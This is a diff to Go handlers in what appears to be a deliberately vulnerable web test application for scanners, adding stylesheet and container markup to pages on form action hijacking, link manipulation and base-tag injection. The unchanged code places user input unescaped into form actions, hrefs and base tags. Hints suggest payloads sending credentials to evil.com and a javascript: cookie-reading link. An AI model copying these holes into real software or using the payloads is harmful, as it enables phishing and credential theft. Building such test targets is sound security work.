@@ -37,8 +37,12 @@ func formAction(w http.ResponseWriter, r *http.Request) {
 	// VULNERABLE: User-controlled form action
 	fmt.Fprintf(w, `<!DOCTYPE html>
 <html>
-<head><title>Form Action Hijacking</title></head>
+<head>
+<title>Form Action Hijacking</title>
+<link rel="stylesheet" href="/static/css/hive.css">
+</head>
 <body>
+<div class="container">
 <h1>Form Action Hijacking</h1>
 <p>The form action is controlled by a URL parameter.</p>
 
@@ -56,6 +60,7 @@ func formAction(w http.ResponseWriter, r *http.Request) {
 <p><small>Try: ?action=https://evil.com/phish</small></p>
 <p><small>Credentials will be sent to the attacker's server</small></p>
 <p><a href="/vulns/formhijack/">Back to Form Hijack Tests</a></p>
+</div>
 </body></html>`, action, action)
 }
 
@@ -70,8 +75,12 @@ func hiddenField(w http.ResponseWriter, r *http.Request) {
 	// VULNERABLE: Hidden field with user-controlled value
 	fmt.Fprintf(w, `<!DOCTYPE html>
 <html>
-<head><title>Form Action Hijacking - Hidden Field</title></head>
+<head>
+<title>Form Action Hijacking - Hidden Field</title>
+<link rel="stylesheet" href="/static/css/hive.css">
+</head>
 <body>
+<div class="container">
 <h1>Form Action Hijacking - Hidden Field</h1>
 <p>Hidden field contains a URL that could be manipulated.</p>
 
@@ -87,6 +96,7 @@ func hiddenField(w http.ResponseWriter, r *http.Request) {
 <h3>Hint:</h3>
 <p><small>Try: ?return=https://evil.com/phish</small></p>
 <p><a href="/vulns/formhijack/">Back to Form Hijack Tests</a></p>
+</div>
 </body></html>`, returnURL, returnURL)
 }
 
@@ -101,8 +111,12 @@ func formactionAttr(w http.ResponseWriter, r *http.Request) {
 	// VULNERABLE: formaction attribute override
 	fmt.Fprintf(w, `<!DOCTYPE html>
 <html>
-<head><title>Form Action Hijacking - formaction</title></head>
+<head>
+<title>Form Action Hijacking - formaction</title>
+<link rel="stylesheet" href="/static/css/hive.css">
+</head>
 <body>
+<div class="container">
 <h1>Form Action Hijacking - formaction Attribute</h1>
 <p>Button's formaction attribute overrides form action.</p>
 
@@ -119,6 +133,7 @@ func formactionAttr(w http.ResponseWriter, r *http.Request) {
 <p><small>Try: ?submit=https://evil.com/steal</small></p>
 <p><small>The "Special Submit" button sends data to attacker</small></p>
 <p><a href="/vulns/formhijack/">Back to Form Hijack Tests</a></p>
+</div>
 </body></html>`, submitURL, submitURL)
 }
 
@@ -133,8 +148,12 @@ func linkManip(w http.ResponseWriter, r *http.Request) {
 	// VULNERABLE: User-controlled link href
 	fmt.Fprintf(w, `<!DOCTYPE html>
 <html>
-<head><title>Link Manipulation</title></head>
+<head>
+<title>Link Manipulation</title>
+<link rel="stylesheet" href="/static/css/hive.css">
+</head>
 <body>
+<div class="container">
 <h1>Link Manipulation</h1>
 <p>The link destination is controlled by a URL parameter.</p>
 
@@ -147,6 +166,7 @@ func linkManip(w http.ResponseWriter, r *http.Request) {
 <p><small>Try: ?href=https://evil.com/phish</small></p>
 <p><small>Or: ?href=javascript:alert(document.cookie)</small></p>
 <p><a href="/vulns/formhijack/">Back to Form Hijack Tests</a></p>
+</div>
 </body></html>`, href, href)
 }
 
@@ -163,9 +183,11 @@ func baseTag(w http.ResponseWriter, r *http.Request) {
 <html>
 <head>
 <title>Link Manipulation - Base Tag</title>
+<link rel="stylesheet" href="/static/css/hive.css">
 <base href="%s">
 </head>
 <body>
+<div class="container">
 <h1>Link Manipulation - Base Tag</h1>
 <p>The base tag affects all relative URLs on the page.</p>
 
@@ -183,6 +205,7 @@ func baseTag(w http.ResponseWriter, r *http.Request) {
 <p><small>Try: ?base=https://evil.com/</small></p>
 <p><small>All relative links will resolve to attacker's domain</small></p>
 <p><a href="/vulns/formhijack/">Back to Form Hijack Tests</a></p>
+</div>
 </body></html>`, base, base)
 }
 
@@ -205,8 +228,12 @@ func fpValidated(w http.ResponseWriter, r *http.Request) {
 
 	fmt.Fprintf(w, `<!DOCTYPE html>
 <html>
-<head><title>Form Action - Safe</title></head>
+<head>
+<title>Form Action - Safe</title>
+<link rel="stylesheet" href="/static/css/hive.css">
+</head>
 <body>
+<div class="container">
 <h1>Form Action - Safe (Validated)</h1>
 
 <form method="POST" action="%s">
@@ -223,5 +250,6 @@ func fpValidated(w http.ResponseWriter, r *http.Request) {
 <p><small>SAFE: Only relative paths starting with / are allowed</small></p>
 <p><small>External URLs and protocol-relative URLs are rejected</small></p>
 <p><a href="/vulns/formhijack/">Back to Form Hijack Tests</a></p>
+</div>
 </body></html>`, safeAction, action, safeAction)
 }
